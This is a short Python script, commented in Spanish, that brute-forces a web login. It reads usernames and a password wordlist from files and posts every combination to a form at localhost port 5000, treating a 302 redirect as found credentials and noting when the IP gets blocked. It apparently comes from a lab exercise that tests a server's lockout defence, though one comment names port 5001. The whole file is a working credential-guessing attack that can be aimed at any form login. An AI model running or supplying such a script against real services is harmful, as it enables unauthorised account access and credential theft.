import requests

# URL sincronizada con el puerto del servidor (5001)
url = "http://127.0.0.1:5000"

# Carga de archivos
try:
    with open("usuarios.txt", "r") as f:
        usuarios = [line.strip() for line in f if line.strip()]
    with open("wordlist.txt", "r") as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print("❌ Error: Asegúrate de que usuarios.txt y wordlist.txt existan.")
    exit()

print(f"🔍 Objetivo: {url}")
print(f"📊 Total de intentos: {len(usuarios) * len(passwords)}\n")

encontrado = False

for username in usuarios:
    for password in passwords:
        try:
            # Enviamos la petición
            response = requests.post(url, data={
                "username": username,
                "password": password
            }, allow_redirects=False)
            if response.status_code == 302:
                print(f"\n{'='*40}\n✅ CREDENCIALES ENCONTRADAS: {username}:{password}\n{'='*40}")
                encontrado = True
                break
            elif response.status_code == 403 or "BLOQUEADA" in response.text:
                print(f"\n{'='*40}\n🔒 ATAQUE DETENIDO: La IP ha sido bloqueada\n{'='*40}")
                encontrado = True
                break
            else:
                print(f"❌ Falló: {username}:{password}")

        except requests.exceptions.ConnectionError:
            print("❌ Error: No se pudo conectar con el servidor. ¿Está encendido?")
            exit()

    if encontrado:
        break

if not encontrado:
    print("\n⛔ No se encontraron credenciales válidas.")